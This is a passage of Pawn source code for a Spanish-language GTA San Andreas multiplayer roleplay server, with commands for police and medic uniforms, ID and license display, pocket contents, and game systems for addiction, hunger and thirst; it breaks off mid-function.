CMD:propero(playerid, params[])
{
	new ropa;

	if(!isPlayerCopOnDuty(playerid))
	    return SendClientMessage(playerid, COLOR_YELLOW2, "Debes estar en servicio para usar este comando.");
	if(!PlayerToPoint(3.0, playerid, POS_POLICE_DUTY_X, POS_POLICE_DUTY_Y, POS_POLICE_DUTY_Z))
	    return SendClientMessage(playerid, COLOR_YELLOW2, "Debes estar en el vestuario.");
	if(sscanf(params, "i", ropa))
	{
		SendClientMessage(playerid, COLOR_WHITE, "{5CCAF1}[Sintaxis]:{C8C8C8} /equipo [equipo]");
		SendClientMessage(playerid, COLOR_GREEN, "|_______ Casilleros PM _______|");
		SendClientMessage(playerid, COLOR_GRAD1, "| 1: Cadete      	        7: Comisionado Mayor");
		SendClientMessage(playerid, COLOR_GRAD1, "| 2: Oficial         	    8: Comisionado General");
		SendClientMessage(playerid, COLOR_GRAD2, "| 3: Oficial Mayor        9: Operaciones Especiales (GEOF)");
		SendClientMessage(playerid, COLOR_GRAD2, "| 4: Subinspector         10: D.I.");
		SendClientMessage(playerid, COLOR_GRAD3, "| 5: Inspector  		    11: Civil");
		SendClientMessage(playerid, COLOR_GRAD4, "| 6: Comisionado");
		return 1;
	}

	switch(ropa)
	{
		case 1:
		{
  			if(PlayerInfo[playerid][pRank] > 8)
				return SendClientMessage(playerid, COLOR_YELLOW2, "Tu rango no tiene acceso a esa vestimenta.");
		    SetPlayerSkin(playerid, 71); // Cadete
      	}
       	case 2:
		{
    		if(PlayerInfo[playerid][pRank] > 7)
				return SendClientMessage(playerid, COLOR_YELLOW2, "Tu rango no tiene acceso a esa vestimenta.");
		    SetPlayerSkin(playerid, 266); // Oficial
		}
  		case 3:
  		{
    		if(PlayerInfo[playerid][pRank] > 6)
				return SendClientMessage(playerid, COLOR_YELLOW2, "Tu rango no tiene acceso a esa vestimenta.");
		    SetPlayerSkin(playerid, 280); // Cabo
      	}
       	case 4:
	   	{
	   		if(PlayerInfo[playerid][pRank] > 5)
            	return SendClientMessage(playerid, COLOR_YELLOW2, "Tu rango no tiene acceso a esa vestimenta.");
        	SetPlayerSkin(playerid, 284); // Sargento
   		}
        case 5:
		{
            if(PlayerInfo[playerid][pRank] > 4)
				return SendClientMessage(playerid, COLOR_YELLOW2, "Tu rango no tiene acceso a esa vestimenta.");
        	SetPlayerSkin(playerid, 281); // Sargento Mayor
        }
        case 6:
		{
            if(PlayerInfo[playerid][pRank] > 3)
                return SendClientMessage(playerid, COLOR_YELLOW2, "Tu rango no tiene acceso a esa vestimenta.");
        	SetPlayerSkin(playerid, 283); // Teniente
        }
        case 7:
		{
            if(PlayerInfo[playerid][pRank] > 2)
                return SendClientMessage(playerid, COLOR_YELLOW2, "Tu rango no tiene acceso a esa vestimenta.");
        	SetPlayerSkin(playerid, 288); // Sub Comisario
        }
        case 8:
		{
            if(PlayerInfo[playerid][pRank] > 1)
                return SendClientMessage(playerid, COLOR_YELLOW2, "Tu rango no tiene acceso a esa vestimenta.");
        	SetPlayerSkin(playerid, 282); // Comisario
        }
        case 9:
		{
        	if(PlayerInfo[playerid][pRank] > 6 || GEOF != 1)
        	    return SendClientMessage(playerid, COLOR_YELLOW2, "Tu rango no tiene acceso a esa vestimenta o G.E.O.F. no est� autorizado.");
        	SetPlayerSkin(playerid, 285); // Geof
        }
        case 10:
		{
			if(PlayerInfo[playerid][pRank] > 4)
        	    return SendClientMessage(playerid, COLOR_YELLOW2, "Tu rango no tiene acceso a esa vestimenta.");
            SetPlayerSkin(playerid, 286); // Fbi
        }
        case 11:
			SetPlayerSkin(playerid, PlayerInfo[playerid][pSkin]); // Civil
        default:
            return SendClientMessage(playerid, COLOR_YELLOW2, "Selecciona una opci�n de vestimenta v�lida.");
	}
	PlayerActionMessage(playerid, 15.0, "toma su vestimenta de los casilleros.");
	return 1;
}

CMD:mequipo(playerid, params[])
{
	new equipo;
	
	if(PlayerInfo[playerid][pFaction] != FAC_HOSP || !MedDuty[playerid])
	    return SendClientMessage(playerid, COLOR_YELLOW2, "Debes estar en servicio como m�dico.");
    if(!PlayerToPoint(5.0, playerid, POS_MEDIC_DUTY_X, POS_MEDIC_DUTY_Y, POS_MEDIC_DUTY_Z))
    	return SendClientMessage(playerid, COLOR_YELLOW2, "Debes estar en el vestuario.");
	if(sscanf(params, "i", equipo))
	{
		SendClientMessage(playerid, COLOR_WHITE, "{5CCAF1}[Sintaxis]:{C8C8C8} /equipo [equipo]");
		SendClientMessage(playerid, COLOR_GREEN, "|_______ Casilleros MED _______|");
		SendClientMessage(playerid, COLOR_GRAD1, "| 1: Param�dico Junior    4: Sub Director");
		SendClientMessage(playerid, COLOR_GRAD1, "| 2: Param�dico Senior    5: Director");
		SendClientMessage(playerid, COLOR_GRAD1, "| 3: M�dico               6: Civil");
		return 1;
	}
	switch(equipo)
	{
		case 1:
		{
            if(PlayerInfo[playerid][pRank] > 8)
                return SendClientMessage(playerid, COLOR_YELLOW2, "Tu rango no tiene acceso a ese equipo.");
        	SetPlayerSkin(playerid, 276); // Param�dico Junior
        }
        case 2:
		{
            if(PlayerInfo[playerid][pRank] > 6)
            	return SendClientMessage(playerid, COLOR_YELLOW2, "Tu rango no tiene acceso a ese equipo.");
        	SetPlayerSkin(playerid, 275); // Param�dico Senior
        }
        case 3:
		{
            if(PlayerInfo[playerid][pRank] > 5)
            	return SendClientMessage(playerid, COLOR_YELLOW2, "Tu rango no tiene acceso a ese equipo.");
        	SetPlayerSkin(playerid, 274); // M�dico
        }
        case 4:
		{
            if(PlayerInfo[playerid][pRank] > 3)
                return SendClientMessage(playerid, COLOR_YELLOW2, "Tu rango no tiene acceso a ese equipo.");
        	SetPlayerSkin(playerid, 70); // Sub Director
        }
        case 5:
		{
            if(PlayerInfo[playerid][pRank] > 1)
                return SendClientMessage(playerid, COLOR_YELLOW2, "Tu rango no tiene acceso a ese equipo.");
        	SetPlayerSkin(playerid, 187); // Director
        }
        case 6:
		{
			SetPlayerSkin(playerid, PlayerInfo[playerid][pSkin]); // Civil
        }
	}
	PlayerInfo[playerid][pHealth] = 100;
	PlayerActionMessage(playerid, 15.0, "se coloca el uniforme de medico y toma su morral del armario.");
	return 1;
}

CMD:camaras(playerid, params[])
{
	if(IsPlayerInRangeOfPoint(playerid, 2.0, 219.36, 188.31, 1003.00))
		ShowPlayerDialog(playerid, DLG_CAMARAS_POLICIA, DIALOG_STYLE_LIST, "Camaras disponibles", "24-7 Unity\nTaller Mercury\nHospital Central\nConsecionarios Grotti\nCentral CTR-MAN\n24-7 Norte\n24-7 Ayuntamiento\n24-7 Este\nBanco de Malos Aires\nAyuntamiento", "Ok", "Cerrar");
	return 1;
}

CMD:salircam(playerid, params[])
{
	if(usingCamera[playerid] == false)
		return SendClientMessage(playerid, COLOR_YELLOW2, "No te encuentras mirando ninguna c�mara.");

	TogglePlayerControllable(playerid, true);
	usingCamera[playerid] = false;
	SetCameraBehindPlayer(playerid);
	SetPlayerPos(playerid,219.36, 188.31, 1003.00);
	SetPlayerVirtualWorld(playerid, 16002);
	SetPlayerInterior(playerid, 3);
	return 1;
}

//=================COMANDOS QUE LISTAN LINEAS / INFORMATIVOS====================

CMD:bol(playerid, params[])
{
	cmd_bolsillo(playerid, params);
	return 1;
}

CMD:bolsillo(playerid, params[])
{
	ShowPocket(playerid, playerid);
	return 1;
}

stock ShowPocket(playerid, targetid)
{
	SendClientMessage(playerid, COLOR_WHITE, "=======================[Bolsillo]=======================");
   	if(PlayerInfo[targetid][pCigarettes] > 0)
   		SendFMessage(playerid, COLOR_WHITE, "- %d cigarrillos.", PlayerInfo[targetid][pCigarettes]);
	if(PlayerInfo[targetid][pLighter])
		SendClientMessage(playerid, COLOR_WHITE, "- Encendedor.");
	if(PlayerInfo[targetid][pRadio])
	    SendClientMessage(playerid, COLOR_WHITE, "- Radio Walkie Talkie.");
    if(PlayerInfo[targetid][pMask] > 0)
        SendClientMessage(playerid, COLOR_WHITE, "- Pa�uelo.");
    if(PlayerInfo[targetid][pPhoneNumber] > 0)
        SendClientMessage(playerid, COLOR_WHITE, "- Tel�fono.");
	if(PlayerInfo[targetid][pMarijuana] > 0)
	    SendFMessage(playerid, COLOR_WHITE, "- Marihuana: %d gramos.", PlayerInfo[targetid][pMarijuana]);
	if(PlayerInfo[targetid][pLSD] > 0)
	    SendFMessage(playerid, COLOR_WHITE, "- LSD: %d dosis.", PlayerInfo[targetid][pLSD]);
	if(PlayerInfo[targetid][pEcstasy] > 0)
	    SendFMessage(playerid, COLOR_WHITE, "- Extasis: %d pastillas.", PlayerInfo[targetid][pEcstasy]);
	if(PlayerInfo[targetid][pCocaine] > 0)
	    SendFMessage(playerid, COLOR_WHITE, "- Coca�na: %d gramos.", PlayerInfo[targetid][pCocaine]);
	SendClientMessage(playerid, COLOR_WHITE, "=====================================================");
}

CMD:mostrardoc(playerid, params[])
{
	new targetid, sexText[15];

    if(sscanf(params, "u", targetid))
        return SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{5CCAF1}[Sintaxis]:{C8C8C8} /mostrardoc [ID/Jugador]");
    if(!IsPlayerConnected(targetid) || targetid == INVALID_PLAYER_ID)
        return SendClientMessage(playerid, COLOR_YELLOW2, "Jugador inv�lido.");
	if(!ProxDetectorS(2.0, playerid, targetid))
	    return SendClientMessage(playerid, COLOR_YELLOW2, "El jugador se encuentra demasiado lejos.");

	switch(PlayerInfo[targetid][pSex]) {
 		case 0: sexText = "Femenino";
 		case 1: sexText = "Masculino";
	}
	SendClientMessage(targetid, COLOR_LIGHTGREEN, "=====================[Documento de Identidad]=====================");
 	SendFMessage(targetid, COLOR_WHITE, "Nombre: %s", GetPlayerNameEx(playerid));
 	SendFMessage(targetid, COLOR_WHITE, "Edad: %d", PlayerInfo[playerid][pAge]);
 	SendFMessage(targetid, COLOR_WHITE, "Sexo: %s", sexText);

	PrintPlayerHouseAddress(playerid, targetid);
		
	SendClientMessage(targetid, COLOR_LIGHTGREEN, "===============================================================");
	PlayerPlayerActionMessage(playerid, targetid, 15.0, "toma su documento del bolsillo y se lo muestra a");
	return 1;
}

CMD:mostrarced(playerid, params[])
{
	new targetid, vehicleid;

    if(sscanf(params, "ui", targetid, vehicleid))
        return SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{5CCAF1}[Sintaxis]:{C8C8C8} /mostrarced [ID/Jugador] [ID veh�culo]");
    if(!IsPlayerConnected(targetid) || !ProxDetectorS(2.0, playerid, targetid))
        return SendClientMessage(playerid, COLOR_YELLOW2, "Jugador inv�lido o demasiado lejos.");
	if(vehicleid < 1 || vehicleid >= MAX_VEH)
        return SendClientMessage(playerid, COLOR_YELLOW2, "Veh�culo inv�lido.");

	if(playerOwnsCar(playerid, vehicleid))
	{
		SendClientMessage(targetid, COLOR_LIGHTGREEN, "================[C�dula Verde de Identificaci�n del Automotor]===============");
		SendFMessage(targetid, COLOR_WHITE, "Veh�culo ID: %d", vehicleid);
	    SendFMessage(targetid, COLOR_WHITE, "Patente %s", VehicleInfo[vehicleid][VehPlate]);
	    SendFMessage(targetid, COLOR_WHITE, "Modelo %s", GetVehicleName(vehicleid));
	    SendFMessage(targetid, COLOR_WHITE, "Titular: %s", VehicleInfo[vehicleid][VehOwnerName]);
	    SendClientMessage(targetid, COLOR_WHITE, "Expedido por: Registro Nacional de la Propiedad del Automotor");
	    SendClientMessage(targetid, COLOR_LIGHTGREEN, "====================================================================");
	    PlayerPlayerActionMessage(playerid, targetid, 15.0, "toma una c�dula verde del bolsillo y se la muestra a");
    }
    else if(playerHasCarKey(playerid, vehicleid) ||
	    (VehicleInfo[vehicleid][VehType] == VEH_FACTION && PlayerInfo[playerid][pFaction] == VehicleInfo[vehicleid][VehFaction]) ||
	    (VehicleInfo[vehicleid][VehType] == VEH_RENT && PlayerInfo[playerid][pRentCarID] == vehicleid) )
	{
		SendClientMessage(targetid, COLOR_LIGHTBLUE, "================[C�dula Azul de Identificaci�n del Automotor]===============");
        SendFMessage(targetid, COLOR_WHITE, "Nombre: %s", GetPlayerNameEx(playerid));
		SendFMessage(targetid, COLOR_WHITE, "Veh�culo ID: %d", vehicleid);
	    SendFMessage(targetid, COLOR_WHITE, "Patente %s", VehicleInfo[vehicleid][VehPlate]);
	    SendFMessage(targetid, COLOR_WHITE, "Modelo %s", GetVehicleName(vehicleid));
	    SendFMessage(targetid, COLOR_WHITE, "Titular: %s", VehicleInfo[vehicleid][VehOwnerName]);
	    SendClientMessage(targetid, COLOR_WHITE, "Expedido por: Registro Nacional de la Propiedad del Automotor");
	    SendClientMessage(targetid, COLOR_LIGHTBLUE, "===================================================================");
	    PlayerPlayerActionMessage(playerid, targetid, 15.0, "toma una c�dula azul del bolsillo y se la muestra a");
    }
    else
		SendClientMessage(playerid, COLOR_YELLOW2, "No tienes ninguna c�dula de ese veh�culo.");
	return 1;
}

CMD:mostrarlic(playerid, params[])
{
	new targetid, lic[20];

    if(sscanf(params, "s[20]u", lic, targetid))
        return SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{5CCAF1}[Sintaxis]:{C8C8C8} /mostrarlic [Licencia] [ID/Jugador]. Licencias: conducir - vuelo - armas.");
    if(!IsPlayerConnected(targetid) || targetid == INVALID_PLAYER_ID)
        return SendClientMessage(playerid, COLOR_YELLOW2, "Jugador inv�lido.");
	if(!ProxDetectorS(2.0, playerid, targetid))
	    return SendClientMessage(playerid, COLOR_YELLOW2, "El jugador se encuentra demasiado lejos.");

    if(strcmp(lic, "conducir", true) == 0)
    {
        if(!PlayerInfo[playerid][pCarLic])
            return SendClientMessage(playerid, COLOR_YELLOW2, "No tienes una licencia de conducir.");
    	SendClientMessage(targetid, COLOR_LIGHTGREEN, "=======================[Licencia de Conducir]======================");
        SendFMessage(targetid, COLOR_WHITE, "Nombre: %s", GetPlayerNameEx(playerid));
       	SendFMessage(targetid, COLOR_WHITE, "Edad: %d", PlayerInfo[playerid][pAge]);
       	SendClientMessage(targetid, COLOR_WHITE, "Categor�a: Original");
       	SendClientMessage(targetid, COLOR_WHITE, "Expedido por: Ministerio del Interior");
       	SendClientMessage(targetid, COLOR_LIGHTGREEN, "===============================================================");
       	PlayerPlayerActionMessage(playerid, targetid, 15.0, "toma su licencia de conducir del bolsillo y se la muestra a");
 	} else
	    if(strcmp(lic, "vuelo", true) == 0)
	    {
	        if(!PlayerInfo[playerid][pFlyLic])
	            return SendClientMessage(playerid, COLOR_YELLOW2, "No tienes una licencia de vuelo.");
	    	SendClientMessage(targetid, COLOR_LIGHTGREEN, "========================[Licencia de Vuelo]========================");
	        SendFMessage(targetid, COLOR_WHITE, "Nombre: %s", GetPlayerNameEx(playerid));
	       	SendFMessage(targetid, COLOR_WHITE, "Edad: %d", PlayerInfo[playerid][pAge]);
	       	SendClientMessage(targetid, COLOR_WHITE, "Expedido por: Direcci�n Nacional de Aeron�utica Civ�l");
	       	SendClientMessage(targetid, COLOR_LIGHTGREEN, "===============================================================");
	       	PlayerPlayerActionMessage(playerid, targetid, 15.0, "toma su licencia de vuelo del bolsillo y se la muestra a");
	 	} else
	   		if(strcmp(lic, "armas", true) == 0)
		    {
		        if(!PlayerInfo[playerid][pWepLic])
		            return SendClientMessage(playerid, COLOR_YELLOW2, "No tienes una licencia de portaci�n de armas.");
		    	SendClientMessage(targetid, COLOR_LIGHTGREEN, "==================[Licencia de Portaci�n de Armas]===================");
		        SendFMessage(targetid, COLOR_WHITE, "Nombre: %s", GetPlayerNameEx(playerid));
		       	SendFMessage(targetid, COLOR_WHITE, "Edad: %d", PlayerInfo[playerid][pAge]);
		       	SendClientMessage(targetid, COLOR_WHITE, "Habilita: Pistola 9mm - Pistola Desert Eagle - Escopeta - Rifle de Caza");
		       	SendClientMessage(targetid, COLOR_WHITE, "Expedido por: Ministerio de Seguridad P�blica");
		       	SendClientMessage(targetid, COLOR_LIGHTGREEN, "===============================================================");
		       	PlayerPlayerActionMessage(playerid, targetid, 15.0, "toma su licencia de portaci�n de armas del bolsillo y se la muestra a");
		 	} else
		 	    return SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{5CCAF1}[Sintaxis]:{C8C8C8} /mostrarlic [Licencia] [ID/Jugador]. Licencias: conducir - vuelo - armas.");
	return 1;
}

//===========================SISTEMA DE ADICCIONES==============================

AddPlayerAdiction(playerid, Float:drugAdiction)
{
	if(PlayerInfo[playerid][pAdictionPercent] + drugAdiction < 100.0)
		PlayerInfo[playerid][pAdictionPercent] += drugAdiction;
	else
	    PlayerInfo[playerid][pAdictionPercent] = 100.0;
	PlayerInfo[playerid][pAdictionAbstinence] = 30 * 60 + ADICTION_ABSTINENCE_MAX - floatround(PlayerInfo[playerid][pAdictionPercent] * (ADICTION_ABSTINENCE_MAX / 100), floatround_round);
}

Float:GetPlayerAdiction(playerid)
{
	return PlayerInfo[playerid][pAdictionPercent];
}

DeletePlayerAdiction(playerid, Float:drugAdiction)
{
	if(PlayerInfo[playerid][pAdictionPercent] - drugAdiction > 0.0)
    	PlayerInfo[playerid][pAdictionPercent] -= drugAdiction;
	else
	    PlayerInfo[playerid][pAdictionPercent] = 0.0;
    PlayerInfo[playerid][pAdictionAbstinence] = 30 * 60 + ADICTION_ABSTINENCE_MAX - floatround(PlayerInfo[playerid][pAdictionPercent] * (ADICTION_ABSTINENCE_MAX / 100), floatround_round);
}

forward UpdatePlayerAdiction();
public UpdatePlayerAdiction()
{
    foreach(new playerid : Player)
    {
    	if(!IsPlayerAfk(playerid) && PlayerInfo[playerid][pJailed] != 2 && AdminDuty[playerid] != 1) // Si no est� AFK ni en Jail OOC
		{
			if(PlayerInfo[playerid][pAdictionPercent] > 0.0)
			{
			    if(PlayerInfo[playerid][pAdictionAbstinence] <= 30 * 60)
			    {
			    	if(PlayerInfo[playerid][pAdictionAbstinence] > 0)
					{
			        	PlayerInfo[playerid][pAdictionAbstinence] -= ADICTION_UPDATE_TIME;
			        	if(PlayerInfo[playerid][pAdictionAbstinence] <= 0.0)
			        	    SendClientMessage(playerid, COLOR_RED, "Ultima advertencia, consume alguna droga antes de los pr�ximos 5 minutos o tu estado ser� cr�tico");
			        	else
							SendFMessage(playerid, COLOR_RED, "Entras en abstinencia. Consume alguna droga dentro de %d minutos o entrar�s en estado cr�tico.", PlayerInfo[playerid][pAdictionAbstinence] / 60);
					} else
		   				{
							SendClientMessage(playerid, COLOR_RED, "Entras en un estado cr�tico causado por tu abstinencia. Unos param�dicos te socorren y te llevan al hospital.");
							SendClientMessage(playerid, COLOR_RED, "Luego de un tiempo logran salvarte, cobr�ndote $7.500. Si no lo tienes se descontar� de tu cuenta bancaria.");
	   						if(GetPlayerCash(playerid) > ADICTION_REHAB_PRICE)
								GivePlayerCash(playerid, -ADICTION_REHAB_PRICE); // se cobra 7 mil por el tratamiento + 500 normales por morir
							else
								if(GetPlayerCash(playerid) > 0)
								{
									PlayerInfo[playerid][pBank] -= ADICTION_REHAB_PRICE - GetPlayerCash(playerid);
							    	ResetPlayerCash(playerid);
								} else
							    	PlayerInfo[playerid][pBank] -= ADICTION_REHAB_PRICE;
							SetPlayerHealthEx(playerid, 0.0);
		                    PlayerInfo[playerid][pAdictionAbstinence] = 30 * 60 + ADICTION_ABSTINENCE_MAX - floatround(PlayerInfo[playerid][pAdictionPercent] * (ADICTION_ABSTINENCE_MAX / 100), floatround_round);
			    		}
				} else
			        PlayerInfo[playerid][pAdictionAbstinence] -= ADICTION_UPDATE_TIME;
			}
		}
	}
	return 1;
}

//==========================SISTEMA DE HAMBRE Y SED=============================

CreatePlayerBasicNeeds(playerid)
{
	PTD_BasicNeeds[playerid] = CreatePlayerTextDraw(playerid, 525.000000, 99.000000, " ");
	PlayerTextDrawBackgroundColor(playerid, PTD_BasicNeeds[playerid], 255);
	PlayerTextDrawFont(playerid, PTD_BasicNeeds[playerid], 1);
	PlayerTextDrawLetterSize(playerid, PTD_BasicNeeds[playerid], 0.300000, 1.200000);
	PlayerTextDrawColor(playerid, PTD_BasicNeeds[playerid], -1);
	PlayerTextDrawSetOutline(playerid, PTD_BasicNeeds[playerid], 1);
	PlayerTextDrawSetProportional(playerid, PTD_BasicNeeds[playerid], 1);
	PlayerTextDrawShow(playerid, PTD_BasicNeeds[playerid]);

	UpdatePlayerBasicNeedsTextdraws(playerid);
}

ShowPlayerBasicNeeds(playerid)
{
    PlayerTextDrawShow(playerid, PTD_BasicNeeds[playerid]);
}

HidePlayerBasicNeeds(playerid)
{
	PlayerTextDrawHide(playerid, PTD_BasicNeeds[playerid]);
}

UpdatePlayerBasicNeedsTextdraws(playerid)
{
	new string[40];

	if(PlayerInfo[playerid][pHunger] > 30) // hambre verde
	{
		if(PlayerInfo[playerid][pThirst] > 30)
		    format(string, sizeof(string), "~w~Hambre: ~g~%d~n~~w~Sed: ~g~%d", PlayerInfo[playerid][pHunger], PlayerInfo[playerid][pThirst]); // sed verde
		else if(PlayerInfo[playerid][pThirst] > 15)
		    format(string, sizeof(string), "~w~Hambre: ~g~%d~n~~w~Sed: ~y~%d", PlayerInfo[playerid][pHunger], PlayerInfo[playerid][pThirst]); // sed amarillo
		else
	        format(string, sizeof(string), "~w~Hambre: ~g~%d~n~~w~Sed: ~r~%d", PlayerInfo[playerid][pHunger], PlayerInfo[playerid][pThirst]); // sed rojo
	}
	else if(PlayerInfo[playerid][pHunger] > 15) // hambre amarillo
 	{
		if(PlayerInfo[playerid][pThirst] > 30)
		    format(string, sizeof(string), "~w~Hambre: ~y~%d~n~~w~Sed: ~g~%d", PlayerInfo[playerid][pHunger], PlayerInfo[playerid][pThirst]); // sed verde
		else if(PlayerInfo[playerid][pThirst] > 15)
		    format(string, sizeof(string), "~w~Hambre: ~y~%d~n~~w~Sed: ~y~%d", PlayerInfo[playerid][pHunger], PlayerInfo[playerid][pThirst]); // sed amarillo
		else
	        format(string, sizeof(string), "~w~Hambre: ~y~%d~n~~w~Sed: ~r~%d", PlayerInfo[playerid][pHunger], PlayerInfo[playerid][pThirst]); // sed rojo
	}
	else // hambre rojo
	{
		if(PlayerInfo[playerid][pThirst] > 30)
		    format(string, sizeof(string), "~w~Hambre: ~r~%d~n~~w~Sed: ~g~%d", PlayerInfo[playerid][pHunger], PlayerInfo[playerid][pThirst]); // sed verde
		else if(PlayerInfo[playerid][pThirst] > 15)
		    format(string, sizeof(string), "~w~Hambre: ~r~%d~n~~w~Sed: ~y~%d", PlayerInfo[playerid][pHunger], PlayerInfo[playerid][pThirst]); // sed amarillo
		else
	        format(string, sizeof(string), "~w~Hambre: ~r~%d~n~~w~Sed: ~r~%d", PlayerInfo[playerid][pHunger], PlayerInfo[playerid][pThirst]); // sed rojo
    }

    PlayerTextDrawSetString(playerid, PTD_BasicNeeds[playerid], string);
}

RefillPlayerBasicNeeds(playerid)
{
	if(PlayerInfo[playerid][pThirst] <= 0) // Si murio por falta de agua
	{
	    PlayerInfo[playerid][pThirst] = 30;
        UpdatePlayerBasicNeedsTextdraws(playerid);
	}
	if(PlayerInfo[playerid][pHunger] <= 0) // Si murio por falta de comida
	{
	    PlayerInfo[playerid][pHunger] = 30;
        UpdatePlayerBasicNeedsTextdraws(playerid);
	}
}

forward UpdatePlayerBasicNeeds();
public UpdatePlayerBasicNeeds()
{
	new percentLoss = 100 / (BASIC_NEEDS_MAX_TIME / BASIC_NEEDS_UPDATE_TIME);

    foreach(new playerid : Player)
    {
        if(!IsPlayerAfk(playerid) && PlayerInfo[playerid][pJailed] != 2 && AdminDuty[playerid] != 1) // Si no est� AFK ni en Jail OOC
		{
			if(PlayerInfo[playerid][pThirst] > 0)
			{
				if(PlayerInfo[playerid][pThirst] - percentLoss <= 0)
					PlayerInfo[playerid][pThirst] = 0;
				else
					PlayerInfo[playerid][pThirst] -= percentLoss;
			  	UpdatePlayerBasicNeedsTextdraws(playerid);
			} else
			    {
				    if(PlayerInfo[playerid][pHealth] - BASIC_NEEDS_HP_LOSS <= 0)
				        PlayerInfo[playerid][pHealth] = 0;
					else
			 			PlayerInfo[playerid][pHealth] -= BASIC_NEEDS_HP_LOSS;
			    	SendClientMessage(playerid, COLOR_RED, "Estas deshidratandote, bebe algo urgente o morir�s de sed.");
			    }

			if(PlayerInfo[playerid][pHunger] > 0)
			{
				if(PlayerInfo[playerid][pHunger] - percentLoss <= 0)
					PlayerInfo[playerid][pHunger] = 0;
				else
					PlayerInfo[playerid][pHunger] -= percentLoss;
				UpdatePlayerBasicNeedsTextdraws(playerid);
			} else
				{
				    if(PlayerInfo[playerid][pHealth] - BASIC_NEEDS_HP_LOSS <= 0)
				        PlayerInfo[playerid][pHealth] = 0;
					else
			 			PlayerInfo[playerid][pHealth] -= BASIC_NEEDS_HP_LOSS;
			    	SendClientMessage(playerid, COLOR_RED, "No has comido en mucho tiempo, come algo urgente o morir�s de hambre.");
			    }
		}
	}
	return 1;
}

PlayerDrink(playerid, value)
{
	if(PlayerInfo[playerid][pThirst] + value >= 100)
	{
    	PlayerInfo[playerid][pThirst] = 100;
    	SendClientMessage(playerid, COLOR_YELLOW2, "Has saciado tu sed.");
	}
	else
	    PlayerInfo[playerid][pThirst] += value;
	UpdatePlayerBasicNeedsTextdraws(playerid);
}

PlayerEat(playerid, value)
{
	if(PlayerInfo[playerid][pHunger] + value >= 100)
	{
    	PlayerInfo[playerid][pHunger] = 100;
    	SendClientMessage(playerid, COLOR_YELLOW2, "Te encuentras satisfecho.");
	}
	else
	    PlayerInfo[playerid][pHunger] += value;
    UpdatePlayerBasicNeedsTextdraws(playerid);
}

//=============================COMANDOS DEL SAME================================

CMD:morir(playerid, params[]) {
	if(GetPVarInt(playerid, "disabled") == DISABLE_DEATHBED) {
		SetPVarInt(playerid, "disabled", DISABLE_NONE);
        SetPlayerHealthEx(playerid, 0);
    } else {
        SendClientMessage(playerid, COLOR_YELLOW2, "No puedes utilizarlo en este momento.");
    }
    return 1;
}

CMD:mservicio(playerid, params[])
{
	new string[128];

    if(PlayerInfo[playerid][pFaction] != FAC_HOSP)
		return 1;
	if(!PlayerToPoint(5.0, playerid, POS_MEDIC_DUTY_X, POS_MEDIC_DUTY_Y, POS_MEDIC_DUTY_Z))
		return SendClientMessage(playerid, COLOR_YELLOW2, "�Debes estar en el vestuario!");

	if(MedDuty[playerid] == 0) {
		PlayerInfo[playerid][pHealth] = 100;
		MedDuty[playerid] = 1;
		format(string, sizeof(string), "Anuncio: un param�dico se ha puesto en servicio.", GetPlayerNameEx(playerid));
		SendClientMessageToAll(COLOR_LIGHTGREEN, string);
	} else {
		PlayerActionMessage(playerid,15.0,"se quita el uniforme de medico y guarda su morral en el armario.");
		ResetPlayerWeapons(playerid);
		PlayerInfo[playerid][pHealth] = 100;
		MedDuty[playerid] = 0;
		SetPlayerSkin(playerid, PlayerInfo[playerid][pSkin]);
	}
	return 1;
}

forward HospHeal(playerid);
public HospHeal(playerid)
{
	if(HospHealing[playerid])
	{
		TogglePlayerControllable(playerid, 1);
		SetPlayerHealthEx(playerid, 100.0);
		HospHealing[playerid] = 0;
        PlayerDoMessage(playerid, 15.0, "El m�dico ha finalizado el tratamiento del paciente.");
        SetPVarInt(playerid, "disabled", DISABLE_NONE);
	}
    return 1;
}

CMD:curarse(playerid, params[])
{
	new string[128];

    if(GetPlayerBuilding(playerid) != BLD_HOSP && GetPlayerBuilding(playerid) != BLD_HOSP2)
        return SendClientMessage(playerid, COLOR_YELLOW2, "Debes estar en un hospital para usar este comando.");
	if(!PlayerToPoint(3.0, playerid, POS_HOSP_HEAL_X, POS_HOSP_HEAL_Y, POS_HOSP_HEAL_Z))
		return SendClientMessage(playerid, COLOR_YELLOW2, "Debes registrarte en la sala de recuperaci�n.");
	if(HospHealing[playerid])
		return SendClientMessage(playerid, COLOR_YELLOW2, "Ya est�s siendo curado.");
	if(GetPlayerCash(playerid) < PRICE_HOSP_HEAL)
	{
	    SendFMessage(playerid, COLOR_YELLOW2, "No tienes el dinero necesario para el tratamiento ($%d).", PRICE_HOSP_HEAL);
		return 1;
	}

	GivePlayerCash(playerid, -PRICE_HOSP_HEAL);
	GiveFactionMoney(FAC_HOSP, PRICE_HOSP_HEAL);
	PlayerDoMessage(playerid, 15.0, "Un m�dico examina al paciente y tras un diagnostico inicial, comienza a curarlo.");
	TogglePlayerControllable(playerid, 0);
	SetTimerEx("HospHeal", 30000, false, "i", playerid);
	format(string, sizeof(string), "[Hospital]: El paciente %s se ha registrado en el %s y est� siendo atendido.", GetPlayerNameEx(playerid), Building[GetPlayerBuilding(playerid)][blText]);
	SendFactionMessage(FAC_HOSP, COLOR_WHITE, string);
	HospHealing[playerid] = 1;
	/*TakeHeadShot[playerid] = 0;*/
	SetPVarInt(playerid, "disabled", DISABLE_HEALING);
	GameTextForPlayer(playerid, "Aguarda unos instantes mientras te atienden", 10000, 4);
	return 1;
}

CMD:curar(playerid,params[])
{
    new target, cost;

	if(PlayerInfo[playerid][pFaction] != FAC_HOSP)
	    return 1;
    if(!MedDuty[playerid])
		return SendClientMessage(playerid, COLOR_YELLOW2, "�Debes estar en servicio!");
    if(sscanf(params, "ud", target, cost))
		return SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{5CCAF1}[Sintaxis]:{C8C8C8} /curar [ID/Jugador] [precio]");
	if(cost < 0 || cost > 500)
	    return SendClientMessage(playerid, COLOR_YELLOW2, "�El costo no puede ser menor a 0 o mayor a 500!");
    if(GetPVarInt(playerid, "isHealing") != 0)
        return SendClientMessage(playerid, COLOR_YELLOW2, "�Ya est�s curando a una persona: debes esperar 15 segundos para usar nuevamente el comando!");
	if(target == INVALID_PLAYER_ID || target == playerid)
		return SendClientMessage(playerid, COLOR_YELLOW2, "Jugador inv�lido.");
	if(!ProxDetectorS(2.0, playerid, target))
